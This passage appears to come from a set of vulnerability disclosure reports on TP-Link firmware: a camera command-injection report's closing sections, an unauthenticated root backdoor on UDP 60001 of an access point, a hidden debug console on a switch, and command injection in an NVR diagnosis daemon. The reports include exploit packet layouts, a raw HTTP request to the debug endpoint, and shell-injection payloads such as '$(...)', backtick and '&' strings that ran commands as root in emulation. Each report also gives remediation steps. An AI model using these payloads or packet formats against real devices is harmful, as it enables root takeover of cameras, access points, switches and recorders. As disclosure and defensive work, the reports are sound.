Supporting text evidence in the package: `tmpd-cmdinj-boot.transcript` (engine startup, blacklist recovery, benign self-check), `tmpd-cmdinj-result.transcript` (popen capture with `uid=0(root)`), `tmpd-cmdinj-full.transcript` (all seven payload groups with blocked/bypassed verdicts), `tmpd-cmdinj-codelocation.txt` (full disassembly and byte-level blacklist recovery), `fw-version.transcript` (asset identification), and `run_emulation-boot.transcript` (one-key log).

## Impact

- Any caller channel that feeds attacker-influenced text into `tmp_execute_shell_cmd()` yields arbitrary command execution as root on the camera (the TMPD-related processes run as root); the PoC proves `id` returns `uid=0(root)` and that arbitrary files such as `/etc/passwd` can be read through a newline-appended command.
- The blacklist gap means trivial payloads (a single `\n` or `>`) defeat the filter — no complex escaping is required.
- Compromise of the camera exposes video feeds, credentials, and a foothold into the LAN; the same binary's unfiltered `run_shell_cmd` wrapper enlarges the attack surface further.

## Remediation Suggestions

1. Root fix — parameterized execution instead of shell interpretation: replace `popen(cmd, "r")` with fork + `execvp(argv)`, with callers passing a split argv (e.g. `execute_script` fixed script becomes `{ "/bin/sh", "/usr/bin/tmpd_diag.sh", "--level", "2", NULL }`, and the signature becomes `tmp_execute_run(char *const argv[], char *out, int out_len)`). Newlines, semicolons and backticks inside argv elements are then inert. Read output via pipe + poll and replace `pclose` with `waitpid`.
2. Minimal fix where callers cannot be reworked immediately: replace the six-entry blacklist at 0x00348e1c with a byte-level whitelist over the full `[0, strlen(cmd))` range, allowing only `[A-Za-z0-9_@%+=:,./-]` and space; reject `0x0A`, `0x0D`, `0x09`, `;`, `&`, `|`, `$`, backtick, `'`, `\`, `(`, `)`, `>`, `<`, `*`, `?`, `~`, `#` and return -1 with a log entry. Do not concatenate after validation; make the output length a `size_t` with `snprintf` precision `%.*s`.
3. Correct the three concrete blacklist bugs if a blacklist must remain: (a) `tbl[5]` at 0x00348440 matches `\'` instead of a bare apostrophe and must match 0x27 only; (b) newline 0x0A — the direct cause of this bypass — must be added; (c) `(`, `)`, `>` and `<` must be covered, since blocking only parentheses still leaves file-overwrite via redirection.
4. Shrink the attack surface: collapse the eight call sites into a static "subcommand → fixed argv" mapping that rejects unlisted input; require caller UID checks (root only) on the tmpd factory-test Unix socket at `/tmp/tmpd_uds_name`; forbid `execute_script()` from running caller-supplied script content.
5. Privilege containment: run the factory-test daemon under a dedicated low-privilege account, funnel root-only actions through whitelisted IPC, and restrict writes to a dedicated directory.
6. CI and regression: add static scan rules flagging `popen`/`system` calls whose argument is not protected by execve or whitelist validation; run this package's `poc.py --exec` as a regression — every bypass payload must return -1 (`VERDICT BLOCKED`, non-zero exit) while control `echo hello` keeps working; also fix the sibling `run_shell_cmd` wrapper (0x007db9c → `system@plt`), which performs no sanitization.

## References

- Firmware download (as present in the package): `https://media.tp-link.com.cn/software/TL-AIPC544NP-AZ(2.7-12mm)%20V2.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620250701_1.0.6.zip?forcedownload=TL-AIPC544NP-AZ(2.7-12mm)%20V2.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620250701_1.0.6.zip`

## Discoverer

Vulnerability discovered by **JiuZero**.

title: TP-Link TL-AP302P V2.0 1.0.6: debug_server UDP 60001 Hidden Backdoor Command Execution (Unauthenticated, Root RCE)
content:
# TP-Link TL-AP302P V2.0 1.0.6: debug_server UDP 60001 Hidden Backdoor Command Execution (Unauthenticated, Root RCE)

## Vulnerability Type / CWE

- **Hidden debug backdoor with unauthenticated remote command execution** (CWE-912 Missing Authorization for Critical Function)
- **CWE-78**: the received datagram text is executed via `execve("/bin/sh", ["sh", "-c", <attacker text>])`

## Affected Product

| Vendor | Product | Model | Firmware filename & version | Severity | Component |
| --- | --- | --- | --- | --- | --- |
| TP-Link | TL-AP302P (access point) | TL-AP302P V2.0 | `TL-AP302P V2.0升级软件20230922_1.0.6.zip` (software v1.0.6, build 20230922; inner BIN `TL-AP302P V2.0_1.0.6_Build_20230922_Rel.67288.bin`, 5,383,408 bytes) | Critical | `/usr/bin/debug_server` — hidden command channel listening on UDP 0.0.0.0:60001, auto-started with the system, running as root |

Firmware identity verified inside the package: upgrade package SHA-256 `79fe411167bfe03f6839b3fcc0d24553a65ce65696d35d406ad2a869e9370129`; inner BIN SHA-256 `c4d6be684af1d0a7d2c39ec2d020dca1519fb0522bda55893aab21a7daf8df75`. Product identification from the rootfs: `cat ./squashfs-root/etc/product_info/productinfo` → `TL-AP302P(TP-LINK|CN|N300-2):2.0`, `PRODUCT_ID = 0x03022102`. Architecture: MIPS big-endian (U-Boot 1.1.4 LSDK-10.2, modified LZMA SquashFS at offset 959728); `debug_server` is an ELF 32-bit MSB MIPS32 rel2 binary with debug info, not stripped.

## Vulnerability Description

The firmware ships a hidden debug service `debug_server` that auto-starts with the system, runs as root, listens on UDP 0.0.0.0:60001, and additionally holds an `AF_PACKET` raw socket for replies. The service parses single-datagram commands directly:

- Packets whose first byte is `0x05` are execution-type packets. The only check applied is a single `memcmp` of the 6 bytes at packet offset 2 against the device MAC (obtained at startup via `ioctl SIOCGIFHWADDR` on `br0`) — an enumerable hardware identifier, not a credential.
- The text starting at packet offset 18, with its length taken from the big-endian 32-bit value at offsets 14..17, is copied into a global command buffer by `get_cmd` and passed to `tp_systemEx`, which ends in `execve("/bin/sh", ["sh", "-c", <attacker text>])`.
- The `trans_check` routine is only an IP `in_cksum` verification; it provides no authentication, signature, or replay protection.

Any network position that can reach UDP 60001 can therefore make the device execute arbitrary commands as root with a single UDP datagram. The PoC in the package produced `uid=0(root)` on the emulated target. From an open 60001/UDP position (routable across layer 3, no port whitelist), an attacker gains full device control: arbitrary file read/write, factory reset, firmware flashing, and lateral movement into the attached network. The report notes the impact is compounded by weak root/guest account hashes in the firmware.

## Root Cause Analysis

Delivery path: `./squashfs-root/usr/bin/debug_server` (source file `debug_server.c` per DWARF, line numbers 492 / 185).

Main loop and listeners — `main` at 0x4026c8 binds the UDP command socket and an `AF_PACKET` raw socket; received datagrams land directly in a global buffer:

```
402d78:  recv(fd, buf-32620(gp), 1024, 0)      # UDP 60001 datagram into global buffer
4030c8:  lbu v1,0(v0) + 4030cc: li v0,5        # first byte == 5 -> execution branch
4030e8-0x4030fc: memcmp(packet+2, device-MAC globals, 6)
```

Command assembly — `get_cmd` (0x402594) reads the BE32 command length at packet offsets 14..17, requires it non-zero, and copies the text at offset 18 into the global command buffer with no character whitelist or escaping:

```
402610:  lwl v1,14(v0)                # BE32 command length (offset 14..17)
402674:  jalr t9                      # memcpy(global cmd buffer, packet+18, len)
```

The sink — `main` calls `tp_systemEx` with the attacker-controlled buffer, and `tp_systemEx` (0x400e90) executes it through the shell:

```
40327c:  lw   a0,-32536(gp)           # global command buffer (text from UDP offset 18)
403280:  jal  400e90 <tp_systemEx>    # -> execve("/bin/sh", ["sh","-c",cmd])
```

Cross-validation: `trans_check` was confirmed by DWARF strings and function structure to be only an `in_cksum` checksum (no challenge, signature, or HMAC), and the `tp_systemEx` call site is the only exec escape path in the binary — all other branches use fixed arguments. The memcmp-equality check against the interface MAC is a liveness/peer filter, not authentication.

## Exploitation

Preconditions:

- Ability to send a UDP datagram to the device's port 60001. No credentials of any kind are required (the MAC used for the 6-byte comparison is an enumerable hardware identifier obtainable on-path or by neighbor discovery).
- Verification context: the package reproduces the service under QEMU user-mode (`qemu-mips -L ./squashfs-root ./squashfs-root/usr/bin/debug_server .`); `ss -uln | grep 60001` shows `UNCONN 0 0 0.0.0.0:60001 0.0.0.0:*`.

Step 1 — build the execution packet. Layout (from the PoC's `cmd_pkt`):

```
byte 0      : 0x05                      (exec opcode)
byte 1      : sequence number
bytes 2..7  : device MAC                (memcmp target)
bytes 8..13 : peer MAC (same value in the PoC)
bytes 14..17: BE32 length of the command text
bytes 18..  : command text
```

Step 2 — send it (PoC `poc.py 'id > ./shell-id.txt 2>&1; echo PWNED_CNVD'`, source ports 50001/50002, target UDP 60001; the device MAC is obtained automatically via `ioctl SIOCGIFHWADDR` on `br0`, here `ae:26:6f:1f:02:cc`):

```
[POC] target UDP 60001, MAC=ae266f1f02cc, CMD-CONSTRUCTED: id > ./shell-id.txt 2>&1; echo PWNED_CNVD
no response (debug_server may not ack, exec still proceeds)
```

Step 3 — the server executes the text through `/bin/sh -c` as root. The strace chain captured in `strace-server.log`:

```
recvfrom(3, "\5\1\256&o\37\2\314\256&o\37\2\314\0\0\0)id > ./shell-i"..., 1024, 0,
         {sa_family=AF_INET, sin_port=htons(50001), sin_addr=inet_addr("127.0.0.1")}, [16]) = 59
execve("/bin/sh", ["sh", "-c", "id > ./shell-id.txt 2>&1; echo P"...], 0x62a6e6f53ca0 /* 0 vars */)
```

Step 4 — on-target proof: the file `./shell-id.txt` written by the executed command contains `uid=0(root) gid=0(root) groups=0(root),1000(docker)`, and the PoC reports `VERDICT SUCCESS`.

## Evidence

![Firmware unpacking and identity: extract_firmware.sh verifies the package SHA-256 79fe4111..., slices the modified LZMA SquashFS at offset 959728 with sasquatch, and confirms squashfs-root/usr/bin/debug_server as a MIPS big-endian ELF with product ID 0x03022102 / TL-AP302P 2.0](AP302P_images/fig1.png)

![Target startup: productinfo shows TL-AP302P(TP-LINK|CN|N300-2):2.0, and run_emulation.sh brings up debug_server under qemu-mips with ss -uln showing UNCONN 0.0.0.0:60001 — the hidden backdoor channel listening](AP302P_images/fig2.png)

![End-to-end trigger: poc.py sends the 0x05 exec packet with MAC ae266f1f02cc, the runtime command output shows uid=0(root) gid=0(root) written by debug_server, and VERDICT SUCCESS](AP302P_images/fig3.png)

Supporting text evidence in the package: `strace-server.log` (bind of 0.0.0.0:60001, `recvfrom` of the 59-byte exec packet, `execve("/bin/sh", ["sh","-c",...])`), `shell-id.txt` (root on-disk echo), `emu-boot-transcript.txt` (listening check), `emu-rce-transcript.txt` (complete end-to-end trace), `poc-run.txt` and `evidence-summary.txt`.

## Impact

- Single-packet, unauthenticated, root-level command execution on the access point: arbitrary file read/write, configuration and credential extraction, factory reset, firmware flashing, and use of the AP as a pivot into the wired/wireless network behind it.
- The channel is hidden (undocumented service on a non-standard UDP port) and stateless, so exploitation leaves minimal interaction traces and can be fully replayed.
- Because the only gate is a 6-byte MAC comparison, any attacker who can enumerate the device's MAC (e.g. from ARP/NDP traffic on the same segment, or on-path) satisfies the check.

## Remediation Suggestions

1. Remove `debug_server` and its autostart entries (audit `/etc/rc.d`, init scripts) from production firmware; if required on the production line, enable it only in engineering mode or behind a physical UART-enabled flag, disabled by default via nvram.
2. Shrink the network surface: bind to 127.0.0.1 or an explicit internal segment, and DROP UDP dport 60001 on the INPUT chain; block cross-layer-3 access.
3. If the channel is retained, add real authentication: pre-shared-key `HMAC-SHA256(nonce||cmd||seq)` with random nonces for replay protection (the current `trans_check` is only an in_cksum checksum), a whitelist of production-line diagnostic commands, a dropped-privilege runtime, and audit logging.
4. Replace the execution primitive: `tp_systemEx`'s `execve("/bin/sh", ["-c", cmd])` should become `execve(fixed tool path, argv array)` to eliminate the shell parsing surface.
5. Remedy the related account issues (weak root/guest hashes allowing offline cracking) so low-privilege footholds cannot reach this channel.
6. Regression check: rerun this package's PoC — there must be no `execve(/bin/sh)` in strace, the port must be unreachable from LAN/WAN, and no fork+exec chain may appear.

## References

- Firmware download (as present in the package): `https://media.tp-link.com.cn/software/TL-AP302P%20V2.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620230922_1.0.6.zip?forcedownload=TL-AP302P%20V2.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620230922_1.0.6.zip`

## Discoverer

Vulnerability discovered by **JiuZero**.

title: TP-Link TL-SG2024D V6.0 3.11.2: Management Interface Hidden Debug Backdoor (Unauthenticated, Arbitrary Internal Function Execution)
content:
# TP-Link TL-SG2024D V6.0 3.11.2: Management Interface Hidden Debug Backdoor (Unauthenticated, Arbitrary Internal Function Execution)

## Vulnerability Type / CWE

- **Backdoor / hidden debug interface** allowing unauthorized arbitrary internal function execution
- CWE-912: Missing Authorization for Critical Function; the "Authorized code" gate is a single shared password field with no rate limiting or lockout, enabling brute force (CWE-307 / CWE-521 context)

## Affected Product

| Vendor | Product | Model | Firmware filename & version | Severity | Component |
| --- | --- | --- | --- | --- | --- |
| TP-LINK | TL-SG2024D (L2 managed gigabit switch) | TL-SG2024D, hardware V6.0 | `TL-SG2024D.bin` (from upgrade package `TL-SG2024D V6.0升级软件20260318_3.11.2.zip`, software 3.11.2, build 20260318 per package filename) | High | Web management interface (`debugLogon.cgi` / `debugResult.cgi` / `debugAuthRpm.htm` / `debugRpm.htm`) on the lwIP httpd of a Realtek RTL8382L bare-metal RTOS |

Firmware identity verified inside the package: `TL-SG2024D.bin` SHA-256 `a60bb6d515ae10b09885c5066a161b0f16f6209d696bc4afbd34a3f656a4392c` (1,952,500 bytes), platform Realtek RTL8382L, MIPS32r2 big-endian, flash XIP base 0xbfc00000. The verification harness prints `[ASSET] TP-Link TL-SG2024D V6.0 / SW 3.11.2 (build 20260318)`.

## Vulnerability Description

The TL-SG2024D V6.0 firmware (software 3.11.2) web management service (lwIP httpd) embeds a set of undisclosed debug interfaces:

- `/debugLogon.cgi` — a hidden debug login entry whose form contains a single `password` field (page label "Authorized code", maxlength 200).
- `/debugAuthRpm.htm` / `/debugRpm.htm` — hidden "Function Debugging" console pages shown after login; they submit a `debug_text` field to `/debugResult.cgi`.
- `/debugResult.cgi` — looks up the function named in `debug_text` in an in-firmware debug function registry (file offset 0x13fba8, virtual address 0xbfd3fba8) and directly calls the corresponding function pointer.

The registry holds 33 entries including `getRegValue` / `setRegValue` (register/memory read-write), `getPhyRegValue` / `setPhyRegValue` (PHY register read-write), `memInfoGet` (memory information), and `debug_log_read` / `debug_log_clear`. An attacker who guesses or brute-forces the single "Authorized code" password — the pages expose no rate limiting or lockout — can invoke any of these functions and obtain unauthorized hardware-level control of the switch (arbitrary register read/write, PHY configuration tampering, memory information disclosure). The interface constitutes a vendor backdoor in the production firmware.

## Root Cause Analysis

Entry-point location: disassembling `TL-SG2024D.bin` with `mips-linux-gnu-objdump -EB -b binary -m mips:isa32r2 -D --adjust-vma=0xbfc00000` reveals hidden CGI name strings in the web data region at file offsets 0x1404b5–0x140515: `/debugLogon.cgi`, `/debugResult.cgi`, `/debugAuthRpm.htm`, `/debugRpm.htm` (alongside the legitimate `/reset.cgi`, `reset_op`, `/logon.cgi`). The `/debugAuthRpm.htm` page template at file offset 0x181b19 is the "Function Debugging" console whose `debug_text` field posts to `/debugResult.cgi`.

Parameter handling: the `/debugResult.cgi` response template at file offset 0x17de00 contains the strings `debug_text`, `debug_result`, `notAuthrized`, `Input error!...` — the handler writes the called function's return value into an `<input id="debug_result" ...>` element and returns `notAuthrized` when the session is not authorized. This confirms the interface is protected only by the single-password session established by `debugLogon.cgi`, with no other authentication or rate limiting.

The debug function registry: at file offset 0x13fba8 (VA 0xbfd3fba8) through 0x13ff44, 33 entries of 28 bytes each, laid out as `[4B function pointer][20B name][4B metadata]`, where the parameter count is `(meta>>16)&0xf`. Representative entries (raw bytes shipped as `debug-function-table.bin`, cross-checked against the reproduction harness output):

```
entry 3 : funcptr=0xbfc9b674  name=getRegValue     argc=1
entry 4 : funcptr=0xbfc9b5b0  name=setRegValue     argc=2
entry 5 : funcptr=0xbfc9b518  name=getPhyRegValue  argc=3
entry 6 : funcptr=0xbfc9b444  name=setPhyRegValue  argc=4
entry 7 : funcptr=0xbfc33c38  name=memInfoGet      argc=0
entry 1 : funcptr=0xbfc9bf08  name=debug_log_read  argc=0
entry 2 : funcptr=0xbfc9b834  name=debug_log_clear argc=0
```

The full table spans argument counts 0–7 (e.g. `aclOp` takes 7 arguments) and includes `copyCpuPktToPort`, `tmn_debug_set`, `cloudDebugSwitch`, `setNqaDbg`, `getTaskStack` and others. All function pointers fall within the legitimate code range 0xbfc00000–0xbfdfffff. The `debugResult.cgi` handler linearly searches this table by string comparison against the name in `debug_text` and directly calls the matching function pointer with no authorization or argument-validity checks. Code references to the registry were located at 0xbfcc344c / 0xbfcc4800 / 0xbfcc4988 (loading table-area addresses such as 0xbfd3fd68 and 0xbfd3ff24), confirming the table is live firmware code data rather than dead bytes.

## Exploitation

Preconditions:

- Network reachability of the switch management IP. The debug endpoints live on the regular web management port; no other privilege is required.
- The "Authorized code" password (or its brute-force recovery; the embedded pages implement no rate limiting or lockout).

Step 1 — reach the hidden login page `/debugLogon.htm` (file offset 0x193fb4), which presents a form with the single field `password` labeled "Authorized code" posting to `/debugLogon.cgi`. On success the browser is redirected to `/debugRpm.htm` / `/debugAuthRpm.htm` ("Function Debugging").

Step 2 — submit a function call through the console (or directly to the CGI). The harness constructs the following unauthenticated request shape:

```http
POST /debugResult.cgi HTTP/1.1
Host: <management-ip>
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

debug_text=setRegValue(0xbfd01000,0xdeadbeef)
```

Step 3 — `debugResult.cgi` resolves `setRegValue` in the registry at 0x13fba8 and calls the function pointer 0xbfc9b5b0 with the supplied arguments; the return value is echoed back in `<input id="debug_result" ...>`. Analogous calls (`getRegValue(addr)`, `debug_log_read()`, `getPhyRegValue(...)`) perform register reads, log extraction and PHY access.

Verification performed in the package: the firmware is a Realtek RTL8382L bare-metal RTOS image with no Linux rootfs or user-mode ELF, so the reproduction runs a static/single-function harness (`poc.py` via `run_emulation.sh`) that loads the firmware, verifies the SHA-256, parses the debug registry at 0x13fba8 and emits the attack request. Result: `[VERDICT] debug registry parsed: 33 entries`, seven dangerous hardware-access functions identified (`debug_log_read`, `debug_log_clear`, `getRegValue`, `setRegValue`, `getPhyRegValue`, `setPhyRegValue`, `memInfoGet`), and `[VERDICT] VERDICT SUCCESS` with the unauthenticated `POST /debugResult.cgi` request constructed.

## Evidence

![Firmware hash verification: sha256sum of TL-SG2024D.bin equals a60bb6d515ae10b09885c5066a161b0f16f6209d696bc4afbd34a3f656a4392c, matching the package metadata](SG2024D_images/fig1.png)

![Asset identification: the harness prints [ASSET] TP-Link TL-SG2024D V6.0 / SW 3.11.2 (build 20260318) after verifying the firmware SHA-256 against the expected value](SG2024D_images/fig2.png)

![Registry parse and attack request: [VERDICT] debug registry parsed: 33 entries, the full function-pointer table including getRegValue/setRegValue/getPhyRegValue/setPhyRegValue, the seven dangerous hardware-access functions, and the constructed unauthenticated POST /debugResult.cgi with body debug_text=setRegValue(0xbfd01000,0xdeadbeef), ending in VERDICT SUCCESS](SG2024D_images/fig3.png)

Textual evidence in the package: `reproduce.transcript` (harness startup and `[VERDICT]` traces, exit code 0), `debug-function-table.bin` (raw registry hex from 0x13fba8), and `debug-backdoor-notes.md` (static forensics notes with all file offsets).

## Impact

- An unauthenticated network attacker who recovers the "Authorized code" gains the ability to execute arbitrary internal firmware functions: register/memory read-write (`setRegValue(0xbfd01000,0xdeadbeef)` style calls), PHY register manipulation, memory information disclosure, and log reading/clearing.
- Hardware-level register access on the switch SoC can redirect or degrade traffic, corrupt port configuration, and undermine the integrity of the whole network segment the switch serves.
- The hidden interface with a single shared password and no lockout is by design a backdoor channel in the management plane; even without the password, the endpoints disclose the existence of a debug console to any visitor.

## Remediation Suggestions

1. Remove the hidden debug interfaces from production firmware: delete the `debugLogon.cgi` / `debugResult.cgi` / `debugAuthRpm.htm` / `debugRpm.htm` pages and their routes, and strip the debug function registry at 0x13fba8 and its dispatch logic, eliminating name-based internal function invocation entirely.
2. If debug capability must be retained, gate it with strong authentication and access control: bind the interface to the management VLAN or specific source IPs, require strong per-device credentials with session timeout and login failure lockout/rate limiting, and never a single shared "Authorized code"; log all debug invocations for audit.
3. Strictly whitelist `debug_text`: only allow signed debug commands; the function name and argument count must exactly match a registry entry; never expose hardware register read/write functions such as `getRegValue`, `setRegValue`, `getPhyRegValue`, `setPhyRegValue`, `memInfoGet`.
4. Harden the management plane in released firmware: close default-open management entries on the management port and restrict management traffic sources with ACLs.

## References

- Firmware download (as present in the package): `https://media.tp-link.com.cn/software/TL-SG2024D%20V6.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620260318_3.11.2.zip?forcedownload=TL-SG2024D%20V6.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620260318_3.11.2.zip`

## Discoverer

Vulnerability discovered by **JiuZero**.

title: TP-LINK TL-NVR6104K-L4P V1.0 1.0.26: dsd Network Diagnosis addr OS Command Injection (Authenticated, Root RCE)
content:
# TP-LINK TL-NVR6104K-L4P V1.0 1.0.26: dsd Network Diagnosis addr OS Command Injection (Authenticated, Root RCE)

## Vulnerability Type / CWE

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ("OS Command Injection")
- Root cause of the bypass: incomplete blacklist filtering (**CWE-184** / **CWE-20**) — the firmware's only input filter rejects just two characters, `;` and `|`

## Affected Product

| Vendor | Product | Model | Firmware filename & version | Severity | Component |
| --- | --- | --- | --- | --- | --- |
| TP-LINK | TL-NVR6104K-L4P (4-bay network video recorder, PoE) | TL-NVR6104K-L4P V1.0 | `TL-NVR6104K-L4P V1.0升级软件20251128_1.0.26.zip` (firmware 1.0.26, Build 251128, Rel.45486n) | High | `/usr/bin/dsd` device-service daemon, diagnosis module → service `start` → `chk_gen_diag_cmd` (dsd+0x31478); injection sink at dsd+0x315ec `system()` |

Firmware identity verified inside the package: upgrade package SHA-256 `24e8199f68c0183a99b9123ea8bd6c21844e88dc8d7659153d84ad58184b1937`; firmware image `TL-NVR6104K-L4P V1.0_1.0.26_Build_251128_Rel.45486n.bin` SHA-256 `cae25615051cc1c4cc66bc75c82da8db56447416ef03381dacadd1473cd12017` (16,122,880 bytes, uImage created 2025-11-28, Linux-4.9.84, ARM). Target binary `/usr/bin/dsd`: 594,884 bytes, MD5 `4ae58b5bb32cb773578a3d8b7ea0b0bf`, ARM/Thumb, link address 0x10000, interpreter `/lib/ld-uClibc.so.0`.

## Vulnerability Description

The `/usr/bin/dsd` daemon receives internal IPC requests as JSON over the UNIX socket `/tmp/dsd_server.sock`. The web UI's "network diagnosis" feature submits its parameters through this channel with requests shaped like:

```json
{"diagnose": {"table": "start", "para": {"name": "diag1", "diag_type": "ping", "addr": "1.1.1.1", "num": 1, "size": 56, "timeout": 1}}, "method": "do"}
```

The dsd module/service dispatch table (`.data` at dsd+0xa9870 / 0xa9908) maps module `diagnose` service `start` to handler `chk_gen_diag_cmd` (dsd+0x31478). That function branches on `diag_type` (`ping` / `tracert` / `multiping`), extracts the integer fields `num`, `size`, `timeout` and the string `addr`, then passes `addr` through the firmware's only input filter `check_special_chars` (dsd+0x197c4). That filter compares each byte against exactly two values — `0x3b` (`;`) and `0x7c` (`|`) — and rejects only those. Every other shell metacharacter (`$`, `(`, `)`, backtick, `&`, newline) passes.

After the filter, the address is interpolated unescaped into a shell command template with `snprintf` and the result is handed to `system()`:

```
. /lib/diagnosis/ping.sh %d %d %d %s > /dev/console &        (template at dsd+0x8446b)
. /lib/diagnosis/traceroute.sh %d %s > /dev/console &        (dsd+0x844a1)
. /lib/diagnosis/multiping.sh %d %d %d %s %d &               (dsd+0x844eb)
```

An attacker who can submit a diagnosis request (normally from the authenticated web management UI) can therefore close the argument context with command substitution such as `$(...)` and execute arbitrary commands with the privileges of the daemon, which runs as root.

## Root Cause Analysis

Vulnerable function `chk_gen_diag_cmd` — dsd+0x31478 (Thumb). Step 3, attacker parameter extraction:

```
31576:  ldr  r1, [pc, #200]   ; -> "addr"          <== attacker-controlled
3157a:  blx  1316c <jso_obj_get_string@plt>
3157e:  mov  r4, r0           ; r4 = addr
```

Step 4, the incomplete blacklist filter `check_special_chars` (dsd+0x197c4), the only input filter in the daemon:

```
197d4:  cmp  r2, #59          ; 0x3b ';'   -> reject on hit
197d8:  cmp  r2, #124         ; 0x7c '|'   -> reject on hit
197da:  bne  197c8            ; every other byte -> keep scanning (accepted)
197ee:  movs r0, #1           ; pass, return 1
```

Call site dsd+0x31588 `bl 197c4 <check_special_chars>`; a return of 1 continues to command assembly.

Step 5, command assembly — `addr` is pushed as the `%s` vararg into the firmware's own template with no escaping:

```
31594:  ldr  r3, [sp, #28]    ; size
31598:  str  r4, [sp, #8]     ; addr as %s vararg
3159a:  mov.w r1, #256        ; 256-byte stack buffer
3159e:  ldr  r2, [pc, #164]   ; -> 0x8446b template ". /lib/diagnosis/ping.sh %d %d %d %s > /dev/console &"
315a8:  blx  12f10 <snprintf@plt>
```

Step 6, the sink:

```
315ec:  add  r0, sp, #40      ; r0 = assembled command line
315ee:  blx  12cc0 <system@plt>   ; <== command injection sink (GOT slot dsd+0xa705c)
```

Step 7 — the same defect exists in the other two branches: the `tracert` branch (dsd+0x315b8 take `addr` → dsd+0x315ca filter → dsd+0x315e8 `snprintf` traceroute template → dsd+0x315ee `system()`) and the `multiping` branch (dsd+0x31772 take `addr` → dsd+0x317b4 filter → dsd+0x317d8 `snprintf` → dsd+0x317de `blx 12cc0 <system@plt>`).

Dispatch table entries recovered from `.data` at 0xa9908: `start`→0x31479 (the vulnerable function), `get`→0x2ffa9, `stop`→0x2fedd, `multistart`→0x31655, `multiget`→0x300f1, `multistop`→0x2ff0d. Field-name constants in `.rodata`: `addr` (0x820cc), `num` (0x8216d), `size` (0x9272d), `timeout` (0x93757).

Dynamic cross-check: mapping the firmware `dsd` image at its link address 0x10000 under QEMU user-mode and calling the firmware's own `check_special_chars` shows `1.1.1.1;id` and `1.1.1.1|id` rejected, while `1.1.1.1$(id)`, `` 1.1.1.1`id` `` and `1.1.1.1&whoami` all pass — confirming the blacklist gap is exploitable rather than theoretical.

## Exploitation

Preconditions:

- Ability to submit a network-diagnosis request to the device. The web management UI's diagnosis page submits through the dsd IPC channel, so a valid web management session is the normal precondition; the daemon-side check is only the two-character blacklist.
- The verification below was performed offline against the delivered firmware (no real device needed): the firmware daemon was started under QEMU user-mode in the unpacked rootfs and its IPC channel exercised, then a firmware-code-level harness mapped `/usr/bin/dsd` at 0x10000 and invoked the firmware's own filter, template string and `system@plt`.

Step 1 — benign vs injected diagnosis request (TLV frame type 1 = JSON request, type 2 = caller info), as sent over `/tmp/dsd_server.sock`:

```
{"diagnose":{"table":"start","para":{"name":"probe","diag_type":"ping","addr":"127.0.0.1","num":1,"size":56,"timeout":1}},"method":"do"}
{"diagnose":{"table":"start","para":{"name":"probe2","diag_type":"ping","addr":"1.1.1.1$(/bin/busybox id>/tmp/pwned_ipc)","num":1,"size":56,"timeout":1}},"method":"do"}
```

Step 2 — filter behavior demonstrated by the firmware's own function:

```
[FILTER] REJECTED (special char)     : 1.1.1.1;id
[FILTER] REJECTED (special char)     : 1.1.1.1|id
[FILTER] ACCEPTED (no ';'/'|' found) : 1.1.1.1$(id)
[FILTER] ACCEPTED (no ';'/'|' found) : 1.1.1.1`id`
[FILTER] ACCEPTED (no ';'/'|' found) : 1.1.1.1&whoami
```

Step 3 — command assembly and execution with payload `1.1.1.1$(/bin/busybox id>/tmp/pwned_cnvd)`:

```
[CMD-CONSTRUCTED] . /lib/diagnosis/ping.sh 1 56 1 1.1.1.1$(/bin/busybox id>/tmp/pwned_cnvd) > /dev/console &
[IMPORT] dsd+0x12cc0 system@plt (GOT dsd+0xa705c) -> /bin/sh -c
[RESULT] uid=0(root) gid=0(root) groups=0(root),1000
VERDICT SUCCESS: the address field of the firmware's network diagnosis request executed an attacker supplied command as root (uid=0(root)).
```

Step 4 — on-disk proof inside the firmware root filesystem: the injected command substitution created `/tmp/pwned_cnvd` containing `uid=0(root) gid=0(root) groups=0(root),1000` (`cat ./extract/rootfs/tmp/pwned_cnvd`).

Note: in the emulation environment the full IPC path answers `{"error_code": -40101}` before reaching command assembly because the flash configuration tree is absent (`[flashio] open device failed`); the injection result is therefore verified by the harness that executes the firmware's own `check_special_chars`, template string and `system@plt`.

## Evidence

![PoC driver run: firmware image located and hashed (SHA-256 cae25615..., version 1.0.26), squashfs rootfs unpacked (1738 files), dsd daemon started under QEMU and its IPC channel exercised with benign and injected diagnosis requests](NVR6104K_images/fig1.png)

![Firmware-code-level verification: the daemon's own check_special_chars rejects only ';'/'|' while accepting $(), backticks and &; the assembled command line with the injected $(/bin/busybox id>...) is executed via the firmware's own system@plt, yielding uid=0(root) and VERDICT SUCCESS with on-disk proof /tmp/pwned_cnvd](NVR6104K_images/fig2.png)

Supporting text evidence included in the package: `dsd-diag-inject-boot.txt` (daemon startup and IPC traces, `[BOOT] LISTENING on unix socket ./extract/rootfs/tmp/dsd_server.sock (mode 755)`), `dsd-diag-inject-result.txt` (filter/construction/execution traces ending in `uid=0(root) ... VERDICT SUCCESS`), `dsd-diag-inject-code-location.txt` (objdump excerpts of all three branches, the dispatch table and the template strings), and `poc_run2.txt` (full one-command reproduction log).

## Impact

- Injected commands execute with daemon root privileges (`uid=0`), giving arbitrary read/write of the filesystem, export of configuration and credentials, network reconfiguration, and backdoor implantation — full device compromise of the NVR.
- The defect spans all three diagnosis types (`ping`, `tracert`, `multiping`), so the injection surface is not limited to one branch.
- Because `dsd` is the device service daemon reachable from the web UI, a low-privilege or hijacked management session escalates directly to root command execution.

## Remediation Suggestions

1. Root fix — replace string assembly plus `system()` with argument-array execution: build `char *argv[] = { "/lib/diagnosis/ping.sh", num, size, timeout, addr, NULL };` and use `posix_spawn`/`execve`. `addr` then reaches the diagnostic script as a plain argument and `$()`, backticks and `;` are never evaluated by a shell.
2. Whitelist validation as defense in depth: before any use, accept `addr` only as an IPv4/IPv6 literal or hostname with charset `[0-9a-fA-F.:_-]` (length <= 64); prefer parsing with `inet_pton()`/`getaddrinfo()` and using the normalized result. Range-check `num`/`size`/`timeout` as integers.
3. Remove the blacklist filter: the existing `check_special_chars` (dsd+0x197c4) blocks only `;` and `|` (CWE-184). Simply appending more characters is not viable (`\$`, `${IFS}`, `$IFS` variants remain), so replace it with the whitelist above.
